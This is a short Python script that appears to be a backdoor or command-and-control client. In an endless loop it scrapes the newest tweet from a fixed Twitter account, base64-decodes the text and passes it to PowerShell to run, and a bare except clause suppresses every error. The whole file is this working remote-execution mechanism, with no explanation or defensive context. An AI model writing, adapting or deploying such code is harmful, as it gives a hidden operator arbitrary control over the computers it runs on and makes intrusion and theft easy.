# coding: utf-8
import requests, subprocess, base64
from bs4 import BeautifulSoup

lasttweet = 0

while True:
	url = u'https://twitter.com/EsdQuent'
	r = requests.get(url)
	soup = BeautifulSoup(r.text, 'html.parser')
	try:
		tweets = soup.find('p',{'class': 'TweetTextSize TweetTextSize--normal js-tweet-text tweet-text'}).text
	
		if lasttweet != tweets:
			tweetsDecode = base64.b64decode(tweets)
			result =  subprocess.call(["powershell", tweetsDecode])
		lasttweet = tweets
	except:
		inutile = 1



